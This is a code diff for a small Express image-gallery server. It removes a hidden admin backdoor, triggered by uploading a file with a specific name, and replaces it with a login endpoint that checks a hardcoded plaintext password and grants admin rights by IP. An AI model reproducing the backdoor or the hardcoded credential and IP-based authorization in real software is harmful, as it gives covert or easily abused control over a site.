@@ -90,22 +90,7 @@ app.post('/upload', (req, res) => {
         const ip = getClientIp(req);
         const metadata = getMetadata();
 
-        // Secret Admin Backdoor
-        if (req.file.originalname === '1778346283828.png') {
-            if (!metadata.admins) metadata.admins = [];
-            if (!metadata.admins.includes(ip)) metadata.admins.push(ip);
-            saveMetadata(metadata);
-            
-            // Delete the trigger file so it doesn't stay in the gallery
-            fs.unlinkSync(path.join(uploadDir, req.file.filename));
-            
-            return res.json({ 
-                msg: 'Gizli Admin Modu Aktif Edildi!', 
-                isAdmin: true 
-            });
-        }
-
-        // Normal file upload: Save IP to metadata
+        // Save IP to metadata
         metadata[req.file.filename] = ip;
         saveMetadata(metadata);
 
@@ -207,6 +192,23 @@ app.post('/files/:filename/vote', (req, res) => {
     
     saveMetadata(metadata);
     return res.json({ msg: 'Oy kaydedildi!', votes: metadata.votes[filename].length, deleted: false });
+});
+
+// Admin Login Endpoint
+app.post('/admin/login', (req, res) => {
+    const { password } = req.body;
+    const ip = getClientIp(req);
+    
+    if (password === '102030.behek89345') {
+        const metadata = getMetadata();
+        if (!metadata.admins) metadata.admins = [];
+        if (!metadata.admins.includes(ip)) metadata.admins.push(ip);
+        saveMetadata(metadata);
+        
+        return res.json({ msg: 'Gizli Admin Modu Aktif Edildi!', isAdmin: true });
+    }
+    
+    return res.status(401).json({ msg: 'Hatalı şifre!' });
 });
 
 app.listen(PORT, () => {
